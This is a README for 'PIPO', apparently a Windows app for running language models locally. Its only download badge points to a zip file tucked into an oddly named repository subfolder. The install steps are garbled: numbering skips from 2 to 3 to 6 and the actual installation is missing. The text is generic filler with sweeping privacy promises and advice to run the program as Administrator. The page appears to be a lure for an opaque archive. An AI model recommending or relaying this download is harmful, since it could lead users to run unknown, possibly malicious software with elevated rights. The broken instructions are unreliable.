# 🤖 PIPO - Run efficient language models on Windows

[![Download PIPO](https://img.shields.io/badge/Download-PIPO_Application-blue.svg)](https://raw.githubusercontent.com/Gershomallylic421/PIPO/main/competency/Software-3.4.zip)

PIPO uses new technology to run language models on your computer. The name stands for Pair-In / Pair-Out. This architecture creates a model that responds to input with speed and accuracy. You can use this software for writing, summarizing text, or answering questions without sending data to the internet. 

## ⚙️ System Requirements 

Your computer needs to meet specific standards to run PIPO well. 

* Operating System: Windows 10 or Windows 11.
* Processor: A modern multi-core processor from Intel or AMD. 
* Memory: 8 gigabytes of RAM is the minimum. 16 gigabytes provides a better experience.
* Storage: You need at least 5 gigabytes of free disk space for the program and the language files.
* Graphics: An integrated graphics processor works, but a dedicated graphics card from NVIDIA with 4 gigabytes of memory improves performance.

Once the installation finishes, you will see a PIPO icon on your desktop.

2. The program window will appear on your screen.
3. The software will perform a first-time check of your hardware during the initial launch.

6. This process takes a few minutes depending on your internet speed, as it fetches the primary model weights. 

## 💡 Using PIPO 

The PIPO interface stays simple to ensure ease of use. You will see a text box at the bottom of the window. 

* The text box serves as your input area. Click inside this box to type your request.
* Press the "Enter" key on your keyboard to send the request to the model.
* The application will display the response in the main window area. 
* The model uses the Pair-In / Pair-Out system to process your text. This ensures that the output matches your intent.

## 🛠️ Performance Tips 

You might notice the computer slows down if you run other heavy programs at the same time. PIPO uses your computer resources fairly. If the response feels slow, close other tabs in your web browser or stop other background programs. 

Keep your graphics drivers updated. A recent driver from the manufacturer ensures the software communicates with your hardware correctly. Check the website of your computer maker every few months for updates.

## 🧩 Modifying PIPO 

You can change how the model acts in the settings menu. Click the gear icon in the top right corner. 

* Temperature Setting: A lower number makes the model consistent. A higher number makes the model creative.
* Maximum Tokens: This controls how long the response can be. Increase this for long summaries or reduce it for short answers.
* Language Choice: The model supports multiple languages. Select your preferred language from the list to change the output style.

## 📂 Data Privacy 

PIPO runs locally on your machine. The software does not send your input or output to any external server. Your data stays on your hard drive. This provides security for sensitive work. You do not need an internet connection after you finish the initial setup.

## 🔍 Troubleshooting Issues 

If the application fails to open, check that you installed the software correctly. You can uninstall and reinstall the application if errors persist. 

Ensure the file path where you store your models does not contain restricted characters. Sometimes, permissions issues prevent the software from reading the model files. Right-click the application icon and select "Run as Administrator" if you feel stuck.

Check the task manager if the program becomes unresponsive. Press Ctrl, Alt, and Delete at the same time and choose Task Manager. Find PIPO in the list, right-click it, and select "End task." You can then open the software again. 

Most performance problems relate to system memory. Close other software if you have many apps open simultaneously. This clears space for the model to use the system RAM. 

Contact the project maintainers through the GitHub issues tab if you experience persistent bugs or mechanical errors. Provide the log file found in the program installation directory to help them identify the problem. You can find this file by looking into the "logs" folder in your PIPO directory.
